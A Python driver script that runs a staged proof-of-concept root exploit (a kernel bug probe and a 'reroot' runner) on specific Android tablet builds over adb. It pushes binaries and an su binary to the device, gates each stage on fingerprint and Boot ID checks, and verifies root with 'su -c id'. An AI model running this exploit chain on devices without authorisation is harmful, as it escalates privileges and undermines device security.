#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 yoyicue
"""Diagnose and advance a PD2/PD2P POC through evidence-gated stages."""

from __future__ import annotations

import argparse
import datetime as dt
import json
import subprocess
import sys
from pathlib import Path
from typing import Any


ROOT = Path(__file__).resolve().parents[1]
DEFAULT_BUILD = ROOT / "build" / "xpad2p"
DEFAULT_CATALOG = ROOT / "profiles" / "xpad2p_profiles.json"
DEFAULT_OUTPUT = ROOT / "results" / "auto-poc"
REMOTE_SU = "/data/local/tmp/su"
REMOTE = {
    "ionstack_reroot_device": "/data/local/tmp/ionstack_reroot_device",
    "ionstack_perf_target": "/data/local/tmp/ionstack_perf_target",
    "ionstack_preload.so": "/data/local/tmp/ionstack_preload.so",
    "cve_2026_43499_chainwalk_probe_arm32": (
        "/data/local/tmp/cve43499_chainwalk_probe_arm32"
    ),
}


class AutoPocError(RuntimeError):
    pass


def run(command: list[str], timeout: int = 120) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        command, text=True, errors="replace", capture_output=True,
        timeout=timeout, check=False,
    )


def adb_prefix(serial: str) -> list[str]:
    return ["adb"] + (["-s", serial] if serial else [])


def clean(text: str) -> str:
    return text.replace("\r", "").strip()


def current_boot_id(serial: str) -> str:
    proc = run(
        adb_prefix(serial)
        + ["shell", "cat /proc/sys/kernel/random/boot_id"],
        timeout=30,
    )
    if proc.returncode != 0:
        raise AutoPocError(f"cannot read Boot ID: {proc.stderr}")
    return clean(proc.stdout)


def decide(report: dict[str, Any], action: str) -> dict[str, Any]:
    status = report.get("status")
    candidate = report.get("candidate", {})
    if status not in {"exact", "compatible"}:
        raise AutoPocError(
            f"profile diagnosis is {status}; refusing POC progression"
        )
    if not report.get("release_scope_19_272"):
        raise AutoPocError("fingerprint is outside the selected /19-/272 scope")
    if not all(report.get("technical_identity", {}).values()):
        raise AutoPocError("device/ABI/SDK/kernel-release identity mismatch")
    if not candidate.get("release"):
        raise AutoPocError("selected offset profile is not release-enabled")
    compatible = status == "compatible"
    if compatible and candidate.get("anchor_matches", 0) < 2:
        raise AutoPocError(
            "compatible profile lacks two unique runtime offset anchors"
        )
    return {
        "profile": report.get("selected_profile"),
        "status": status,
        "compatible": compatible,
        "anchor_matches": candidate.get("anchor_matches", 0),
        "effective_action": action,
        "reason": (
            "exact fingerprint+kernel tuple"
            if not compatible
            else "two-or-more unique runtime offset anchors"
        ),
    }


def require_build(build: Path, catalog: Path = DEFAULT_CATALOG) -> None:
    catalog_data = json.loads(catalog.read_text(encoding="utf-8"))
    device = str(catalog_data.get("device", ""))
    if device == "ls12_mt8797_wifi_64":
        expected_profile = "xpad2"
    elif device == "ls14_mt8797_wifi_64":
        expected_profile = "xpad2p"
    else:
        raise AutoPocError(
            f"unsupported catalog device for automatic POC: {device or '-'}"
        )
    stamp = build / ".profile"
    active = stamp.read_text(encoding="utf-8").strip() if stamp.is_file() else ""
    if active != expected_profile:
        raise AutoPocError(
            f"build directory is not the {expected_profile} payload set; "
            f"run make PROFILE={expected_profile} -j4"
        )
    missing = [name for name in REMOTE if not (build / name).is_file()]
    if missing:
        raise AutoPocError(
            "missing build artifacts: " + ", ".join(sorted(missing))
        )


def push_artifacts(serial: str, build: Path) -> None:
    for filename, remote in REMOTE.items():
        proc = run(
            adb_prefix(serial) + ["push", str(build / filename), remote],
            timeout=120,
        )
        if proc.returncode != 0:
            raise AutoPocError(f"adb push failed for {filename}: {proc.stderr}")
    proc = run(
        adb_prefix(serial)
        + ["shell", "chmod", "0700"]
        + list(REMOTE.values()),
        timeout=30,
    )
    if proc.returncode != 0:
        raise AutoPocError(f"chmod artifacts failed: {proc.stderr}")


def run_runner(serial: str, arguments: list[str],
               timeout: int) -> subprocess.CompletedProcess[str]:
    return run(
        adb_prefix(serial)
        + ["exec-out", REMOTE["ionstack_reroot_device"]]
        + arguments,
        timeout=timeout,
    )


def require_runner_result(stage: str,
                          proc: subprocess.CompletedProcess[str],
                          log_path: Path, marker: str) -> None:
    text = proc.stdout
    if proc.stderr:
        text += "\n=== stderr ===\n" + proc.stderr
    log_path.write_text(text, encoding="utf-8")
    if proc.returncode != 0:
        raise AutoPocError(
            f"{stage} failed rc={proc.returncode}; see {log_path}"
        )
    if marker not in proc.stdout:
        raise AutoPocError(f"{stage} emitted no {marker} marker")


def require_same_boot(serial: str, expected: str, stage: str) -> None:
    actual = current_boot_id(serial)
    if actual != expected:
        raise AutoPocError(
            f"Boot ID changed after {stage}: expected={expected} actual={actual}"
        )


def collect_diagnosis(args: argparse.Namespace,
                      output: Path) -> dict[str, Any]:
    diag_dir = output / "profile-diag"
    command = [
        sys.executable,
        str(ROOT / "tools" / "ionstack_profile_diag.py"),
        "collect",
        "--target", str(args.build / "ionstack_perf_target"),
        "--profiles", str(args.catalog),
        "--output", str(diag_dir),
        "--sample-ms", str(args.sample_ms),
        "--freq", str(args.freq),
        "--attempts", str(args.attempts),
        "--workload-timeout", str(args.diag_timeout),
    ]
    if args.serial:
        command += ["--serial", args.serial]
    proc = run(command, timeout=args.diag_timeout * 5)
    (output / "profile-diag-command.log").write_text(
        proc.stdout
        + ("\n=== stderr ===\n" + proc.stderr if proc.stderr else ""),
        encoding="utf-8",
    )
    report_path = diag_dir / "report.json"
    if not report_path.is_file():
        raise AutoPocError("profile diagnostic produced no report.json")
    report = json.loads(report_path.read_text(encoding="utf-8"))
    if proc.returncode != 0:
        raise AutoPocError(
            f"profile diagnostic failed; evidence retained at {diag_dir}"
        )
    return report


def verify_root(serial: str) -> str:
    proc = run(
        adb_prefix(serial)
        + ["shell", REMOTE_SU, "-c", "id"],
        timeout=30,
    )
    if proc.returncode != 0 or "uid=0(root)" not in proc.stdout:
        raise AutoPocError("independent su -c id verification failed")
    return clean(proc.stdout)


def execute(args: argparse.Namespace) -> int:
    require_build(args.build, args.catalog)
    timestamp = dt.datetime.now().astimezone().strftime("%Y%m%d-%H%M%S%z")
    output = args.output / timestamp
    output.mkdir(parents=True, exist_ok=False)

    report = collect_diagnosis(args, output)
    if args.action == "diagnose":
        decision = {
            "profile": report.get("selected_profile"),
            "status": report.get("status"),
            "effective_action": "diagnose",
            "anchor_matches": report.get("candidate", {}).get(
                "anchor_matches", 0
            ),
        }
        (output / "decision.json").write_text(
            json.dumps(decision, indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )
        print(output)
        print(
            f"status={decision['status']} profile={decision['profile']} "
            f"anchors={decision['anchor_matches']} action=diagnose"
        )
        return 0

    decision = decide(report, args.action)
    (output / "decision.json").write_text(
        json.dumps(decision, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    expected_boot_id = str(
        json.loads(
            (output / "profile-diag" / "identity.json").read_text(
                encoding="utf-8"
            )
        )["boot_id"]
    )
    require_same_boot(args.serial, expected_boot_id, "diagnosis")
    push_artifacts(args.serial, args.build)

    profile_args = (
        ["--allow-profile-version-mismatch"]
        if decision["compatible"] else []
    )
    preflight = run_runner(
        args.serial,
        ["--preflight-only"] + profile_args,
        args.stage_timeout,
    )
    require_runner_result(
        "preflight", preflight, output / "preflight.log",
        "[reroot] PREFLIGHT_OK",
    )
    require_same_boot(args.serial, expected_boot_id, "preflight")

    validation = run_runner(
        args.serial,
        ["--validate-only"] + profile_args,
        args.stage_timeout,
    )
    require_runner_result(
        "validation", validation, output / "validation.log",
        "[reroot] VALIDATION_OK",
    )
    require_same_boot(args.serial, expected_boot_id, "validation")
    if args.action == "validate":
        print(output)
        print(
            f"profile={decision['profile']} status={decision['status']} "
            "action=validate write_attempted=0"
        )
        return 0

    root_args = profile_args + (
        ["--accept-compatible-write"] if decision["compatible"] else []
    )
    root = run_runner(args.serial, root_args, args.root_timeout)
    require_runner_result(
        "root", root, output / "root.log", "[reroot] SUCCESS"
    )
    require_same_boot(args.serial, expected_boot_id, "root")
    verify = verify_root(args.serial)
    (output / "root-verification.txt").write_text(
        verify + "\n", encoding="utf-8"
    )
    print(output)
    print(
        f"profile={decision['profile']} status={decision['status']} "
        f"anchors={decision['anchor_matches']} action=root "
        "write_attempted=1 verified_root=1"
    )
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("action", choices=("diagnose", "validate", "root"))
    parser.add_argument("--serial", default="")
    parser.add_argument("--build", type=Path, default=DEFAULT_BUILD)
    parser.add_argument("--catalog", type=Path, default=DEFAULT_CATALOG)
    parser.add_argument("--output", type=Path, default=DEFAULT_OUTPUT)
    parser.add_argument("--sample-ms", type=int, default=2500)
    parser.add_argument("--freq", type=int, default=4000)
    parser.add_argument("--attempts", type=int, default=8)
    parser.add_argument("--diag-timeout", type=int, default=180)
    parser.add_argument("--stage-timeout", type=int, default=1200)
    parser.add_argument("--root-timeout", type=int, default=1200)
    return parser


def main() -> int:
    args = build_parser().parse_args()
    try:
        return execute(args)
    except (
        AutoPocError,
        subprocess.TimeoutExpired,
        OSError,
        ValueError,
        KeyError,
    ) as exc:
        print(f"ionstack-auto-poc: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
